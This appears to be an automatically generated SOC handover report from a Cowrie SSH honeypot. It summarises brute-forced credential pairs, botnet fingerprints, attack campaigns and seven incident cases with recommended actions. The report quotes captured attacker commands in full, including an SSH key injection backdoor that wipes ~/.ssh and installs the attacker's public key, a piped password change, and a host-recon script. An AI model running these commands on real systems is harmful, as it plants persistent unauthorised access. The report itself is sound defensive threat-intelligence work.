# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-26 |
| **Generated At** | 2026-08-26T19:54:30Z |
| **Shift Time** | 19:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **167** |
| Confirmed Threats | **142** |
| False Positives Filtered | **25** (15.0%) |
| Unique Attacker IPs | **73** |
| Countries of Origin | **27** |
| High Severity Cases | **65** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **102** |
| Malware Samples Analyzed | **2** HIGH · **21** MED · 21 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **75** |
| Unique Credential Pairs | **52** |
| Unique Usernames | **7** |
| Unique Passwords | **50** |
| Successful Auth Pairs | **62** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 56 |
| `admin` | 6 |
| `support` | 6 |
| `345gs5662d34` | 3 |
| `db-user` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 7 |
| `` | 6 |
| `support` | 6 |
| `LeitboGi0ro` | 3 |
| `345gs5662d34` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `` | 6 |
| `admin` | `admin` | 6 |
| `support` | `support` | 6 |
| `root` | `LeitboGi0ro` | 3 |
| `345gs5662d34` | `345gs5662d34` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1234` | `195.178.110.227` | 2026-08-26T14:56:10 |
| `root` | `12345` | `195.178.110.227` | 2026-08-26T14:57:59 |
| `root` | `1234567` | `195.178.110.227` | 2026-08-26T15:01:35 |
| `root` | `12345678` | `195.178.110.227` | 2026-08-26T15:03:16 |
| `root` | `123456789` | `195.178.110.227` | 2026-08-26T15:04:56 |
| `root` | `1234567890` | `195.178.110.227` | 2026-08-26T15:06:39 |
| `root` | `123456a` | `195.178.110.227` | 2026-08-26T15:08:17 |
| `root` | `123456b` | `195.178.110.227` | 2026-08-26T15:09:57 |
| `root` | `1234abcd` | `195.178.110.227` | 2026-08-26T15:11:34 |
| `root` | `123abc` | `195.178.110.227` | 2026-08-26T15:13:14 |
| `root` | `123qwe` | `195.178.110.227` | 2026-08-26T15:14:54 |
| `root` | `1q2w3e4r` | `195.178.110.227` | 2026-08-26T15:16:30 |
| `root` | `1qaz2wsx` | `195.178.110.227` | 2026-08-26T15:18:05 |
| `root` | `1qaz@WSX` | `195.178.110.227` | 2026-08-26T15:19:40 |
| `root` | `21` | `195.178.110.227` | 2026-08-26T15:21:18 |
| `root` | `321` | `195.178.110.227` | 2026-08-26T15:23:09 |
| `root` | `4321` | `195.178.110.227` | 2026-08-26T15:25:29 |
| `root` | `54321` | `195.178.110.227` | 2026-08-26T15:28:42 |
| `admin` | `admin` | `23.147.232.237` | 2026-08-26T15:29:36 |
| `root` | `555555` | `195.178.110.227` | 2026-08-26T15:30:17 |
| `root` | `654321` | `195.178.110.227` | 2026-08-26T15:31:53 |
| `root` | `7777777` | `195.178.110.227` | 2026-08-26T15:33:57 |
| `root` | `Admin2026!` | `195.178.110.227` | 2026-08-26T15:37:33 |
| `root` | `P4ssw0rd` | `195.178.110.227` | 2026-08-26T15:39:38 |
| `root` | `P4ssword` | `195.178.110.227` | 2026-08-26T15:41:24 |
| `root` | `P@ssw0rd` | `195.178.110.227` | 2026-08-26T15:43:34 |
| `root` | `P@ssw0rd2026` | `195.178.110.227` | 2026-08-26T15:47:41 |
| `root` | `P@ssword` | `195.178.110.227` | 2026-08-26T15:50:19 |
| `root` | `Passw0rd` | `195.178.110.227` | 2026-08-26T15:52:28 |
| `root` | `Password1` | `195.178.110.227` | 2026-08-26T15:55:17 |
| `root` | `Root123` | `195.178.110.227` | 2026-08-26T15:58:39 |
| `root` | `---fuck_you----` | `103.219.32.239` | 2026-08-26T16:00:47 |
| `root` | `abc123` | `195.178.110.227` | 2026-08-26T16:03:11 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-08-26T16:03:58 |
| `root` | `123@@@` | `165.1.75.106` | 2026-08-26T16:03:59 |
| `support` | `support` | `176.53.159.196` | 2026-08-26T16:07:07 |
| `root` | `admin` | `195.178.110.227` | 2026-08-26T16:08:56 |
| `root` | `alpine` | `195.178.110.227` | 2026-08-26T16:12:08 |
| `root` | `ubuntu` | `124.239.153.90` | 2026-08-26T16:12:59 |
| `root` | `changeme` | `195.178.110.227` | 2026-08-26T16:15:38 |
| `support` | `support` | `10.0.0.73` | 2026-08-26T16:31:58 |
| `db-user` | `db-user` | `96.78.175.36` | 2026-08-26T16:32:47 |
| `345gs5662d34` | `345gs5662d34` | `96.78.175.36` | 2026-08-26T16:32:49 |
| `db-user` | `3245gs5662d34` | `96.78.175.36` | 2026-08-26T16:32:49 |
| `root` | `Abc123@#` | `186.13.24.118` | 2026-08-26T16:54:00 |
| `345gs5662d34` | `345gs5662d34` | `186.13.24.118` | 2026-08-26T16:54:04 |
| `root` | `3245gs5662d34` | `186.13.24.118` | 2026-08-26T16:54:05 |
| `admin` | `admin` | `47.86.57.180` | 2026-08-26T16:59:37 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-26T16:59:38 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-26T17:01:38 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-26T17:01:38 |
| `root` | `﻿------fuck------` | `27.221.13.7` | 2026-08-26T17:19:46 |
| `root` | `---fuck_you----` | `23.95.18.196` | 2026-08-26T17:20:09 |
| `admin` | `admin` | `47.77.189.39` | 2026-08-26T17:35:11 |
| `admin` | `admin` | `108.175.5.23` | 2026-08-26T17:44:23 |
| `root` | `﻿------fuck------` | `219.140.105.152` | 2026-08-26T18:09:11 |
| `root` | `123abc,` | `177.85.247.230` | 2026-08-26T18:19:38 |
| `345gs5662d34` | `345gs5662d34` | `177.85.247.230` | 2026-08-26T18:19:41 |
| `root` | `3245gs5662d34` | `177.85.247.230` | 2026-08-26T18:19:42 |
| `new` | `new` | `101.126.71.100` | 2026-08-26T18:27:09 |
| `root` | `suse` | `117.50.70.169` | 2026-08-26T18:27:58 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `162.216.149.250` | 2026-08-26T18:52:51 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **167** |
| Sessions with Fingerprint | **16** |
| Unique HASSH Fingerprints | **16** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 51 |
| libssh | 31 |
| Paramiko (Python) | 6 |
| Unknown | 1 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 35 | 1 |
| `f555226df196...` | Mirai/variant | 10 | 4 |
| `a2de0f306611...` | Mirai/variant | 5 | 2 |
| `98f63c4d9c87...` | Generic scanner | 4 | 4 |
| `f1e5e9d24e5e...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 35 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 16 | 7 | — |
| `f555226df196...` | libssh | 10 | 4 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 5 | 2 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 4 | 4 | Generic scanner |
| `f1e5e9d24e5e...` | Go SSH scanner | 3 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **9** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 34 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "new\n0gvy2vmtAFDG\n0gvy2vmtAFDG"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `101.126.71.100`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.227`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `177.85.247.230`, `96.78.175.36`, `186.13.24.118`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **73** |
| Unique ASNs | **51** |
| High-Risk ASNs | **37** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 6 | LOW |
| `AS396982` | Google LLC | 5 | HIGH |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS10617` | SION S.A | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS209334` | Modat B.V. | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (64)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4f519d8f18ca

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 14:56 |
| **Last Seen** | 2026-08-26 14:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 14:56:08` | `cowrie.session.connect` |
| `2026-08-26 14:56:08` | `cowrie.client.version` |
| `2026-08-26 14:56:08` | `cowrie.client.kex` |
| `2026-08-26 14:56:10` | `cowrie.login.success` |
| `2026-08-26 14:56:11` | `cowrie.session.params` |
| `2026-08-26 14:56:11` | `cowrie.command.input` |
| `2026-08-26 14:56:11` | `cowrie.command.input` |
| `2026-08-26 14:56:11` | `cowrie.command.input` |
| `2026-08-26 14:56:11` | `cowrie.command.input` |
| `2026-08-26 14:56:11` | `cowrie.command.input` |
| `2026-08-26 14:56:11` | `cowrie.command.success` |
| `2026-08-26 14:56:11` | `cowrie.command.input` |
| `2026-08-26 14:56:11` | `cowrie.command.input` |
| `2026-08-26 14:56:11` | `cowrie.command.input` |
| `2026-08-26 14:56:11` | `cowrie.command.input` |
| `2026-08-26 14:56:11` | `cowrie.log.closed` |
| `2026-08-26 14:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f9b22f330d3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 14:57 |
| **Last Seen** | 2026-08-26 14:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 14:57:57` | `cowrie.session.connect` |
| `2026-08-26 14:57:57` | `cowrie.client.version` |
| `2026-08-26 14:57:57` | `cowrie.client.kex` |
| `2026-08-26 14:57:59` | `cowrie.login.success` |
| `2026-08-26 14:58:00` | `cowrie.session.params` |
| `2026-08-26 14:58:00` | `cowrie.command.input` |
| `2026-08-26 14:58:00` | `cowrie.command.input` |
| `2026-08-26 14:58:00` | `cowrie.command.input` |
| `2026-08-26 14:58:00` | `cowrie.command.input` |
| `2026-08-26 14:58:00` | `cowrie.command.input` |
| `2026-08-26 14:58:00` | `cowrie.command.success` |
| `2026-08-26 14:58:00` | `cowrie.command.input` |
| `2026-08-26 14:58:00` | `cowrie.command.input` |
| `2026-08-26 14:58:00` | `cowrie.command.input` |
| `2026-08-26 14:58:00` | `cowrie.command.input` |
| `2026-08-26 14:58:00` | `cowrie.log.closed` |
| `2026-08-26 14:58:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0550dec24f3b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:01 |
| **Last Seen** | 2026-08-26 15:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:01:33` | `cowrie.session.connect` |
| `2026-08-26 15:01:33` | `cowrie.client.version` |
| `2026-08-26 15:01:33` | `cowrie.client.kex` |
| `2026-08-26 15:01:35` | `cowrie.login.success` |
| `2026-08-26 15:01:37` | `cowrie.session.params` |
| `2026-08-26 15:01:37` | `cowrie.command.input` |
| `2026-08-26 15:01:37` | `cowrie.command.input` |
| `2026-08-26 15:01:37` | `cowrie.command.input` |
| `2026-08-26 15:01:37` | `cowrie.command.input` |
| `2026-08-26 15:01:37` | `cowrie.command.input` |
| `2026-08-26 15:01:37` | `cowrie.command.success` |
| `2026-08-26 15:01:37` | `cowrie.command.input` |
| `2026-08-26 15:01:37` | `cowrie.command.input` |
| `2026-08-26 15:01:37` | `cowrie.command.input` |
| `2026-08-26 15:01:37` | `cowrie.command.input` |
| `2026-08-26 15:01:37` | `cowrie.log.closed` |
| `2026-08-26 15:01:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33d512ce4f3c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:03 |
| **Last Seen** | 2026-08-26 15:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:03:15` | `cowrie.session.connect` |
| `2026-08-26 15:03:15` | `cowrie.client.version` |
| `2026-08-26 15:03:15` | `cowrie.client.kex` |
| `2026-08-26 15:03:16` | `cowrie.login.success` |
| `2026-08-26 15:03:17` | `cowrie.session.params` |
| `2026-08-26 15:03:18` | `cowrie.command.input` |
| `2026-08-26 15:03:18` | `cowrie.command.input` |
| `2026-08-26 15:03:18` | `cowrie.command.input` |
| `2026-08-26 15:03:18` | `cowrie.command.input` |
| `2026-08-26 15:03:18` | `cowrie.command.input` |
| `2026-08-26 15:03:18` | `cowrie.command.success` |
| `2026-08-26 15:03:18` | `cowrie.command.input` |
| `2026-08-26 15:03:18` | `cowrie.command.input` |
| `2026-08-26 15:03:18` | `cowrie.command.input` |
| `2026-08-26 15:03:18` | `cowrie.command.input` |
| `2026-08-26 15:03:18` | `cowrie.log.closed` |
| `2026-08-26 15:03:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-384687c5cc8c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:04 |
| **Last Seen** | 2026-08-26 15:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:04:54` | `cowrie.session.connect` |
| `2026-08-26 15:04:55` | `cowrie.client.version` |
| `2026-08-26 15:04:55` | `cowrie.client.kex` |
| `2026-08-26 15:04:56` | `cowrie.login.success` |
| `2026-08-26 15:04:58` | `cowrie.session.params` |
| `2026-08-26 15:04:58` | `cowrie.command.input` |
| `2026-08-26 15:04:58` | `cowrie.command.input` |
| `2026-08-26 15:04:58` | `cowrie.command.input` |
| `2026-08-26 15:04:58` | `cowrie.command.input` |
| `2026-08-26 15:04:58` | `cowrie.command.input` |
| `2026-08-26 15:04:58` | `cowrie.command.success` |
| `2026-08-26 15:04:58` | `cowrie.command.input` |
| `2026-08-26 15:04:58` | `cowrie.command.input` |
| `2026-08-26 15:04:58` | `cowrie.command.input` |
| `2026-08-26 15:04:58` | `cowrie.command.input` |
| `2026-08-26 15:04:58` | `cowrie.log.closed` |
| `2026-08-26 15:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a9826e75f4e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:06 |
| **Last Seen** | 2026-08-26 15:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:06:36` | `cowrie.session.connect` |
| `2026-08-26 15:06:37` | `cowrie.client.version` |
| `2026-08-26 15:06:37` | `cowrie.client.kex` |
| `2026-08-26 15:06:39` | `cowrie.login.success` |
| `2026-08-26 15:06:40` | `cowrie.session.params` |
| `2026-08-26 15:06:40` | `cowrie.command.input` |
| `2026-08-26 15:06:40` | `cowrie.command.input` |
| `2026-08-26 15:06:40` | `cowrie.command.input` |
| `2026-08-26 15:06:40` | `cowrie.command.input` |
| `2026-08-26 15:06:40` | `cowrie.command.input` |
| `2026-08-26 15:06:40` | `cowrie.command.success` |
| `2026-08-26 15:06:40` | `cowrie.command.input` |
| `2026-08-26 15:06:40` | `cowrie.command.input` |
| `2026-08-26 15:06:40` | `cowrie.command.input` |
| `2026-08-26 15:06:40` | `cowrie.command.input` |
| `2026-08-26 15:06:41` | `cowrie.log.closed` |
| `2026-08-26 15:06:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c01cfa693eb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:08 |
| **Last Seen** | 2026-08-26 15:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:08:15` | `cowrie.session.connect` |
| `2026-08-26 15:08:15` | `cowrie.client.version` |
| `2026-08-26 15:08:15` | `cowrie.client.kex` |
| `2026-08-26 15:08:17` | `cowrie.login.success` |
| `2026-08-26 15:08:19` | `cowrie.session.params` |
| `2026-08-26 15:08:19` | `cowrie.command.input` |
| `2026-08-26 15:08:19` | `cowrie.command.input` |
| `2026-08-26 15:08:19` | `cowrie.command.input` |
| `2026-08-26 15:08:19` | `cowrie.command.input` |
| `2026-08-26 15:08:19` | `cowrie.command.input` |
| `2026-08-26 15:08:19` | `cowrie.command.success` |
| `2026-08-26 15:08:19` | `cowrie.command.input` |
| `2026-08-26 15:08:19` | `cowrie.command.input` |
| `2026-08-26 15:08:19` | `cowrie.command.input` |
| `2026-08-26 15:08:19` | `cowrie.command.input` |
| `2026-08-26 15:08:20` | `cowrie.log.closed` |
| `2026-08-26 15:08:20` | `cowrie.session.closed` |

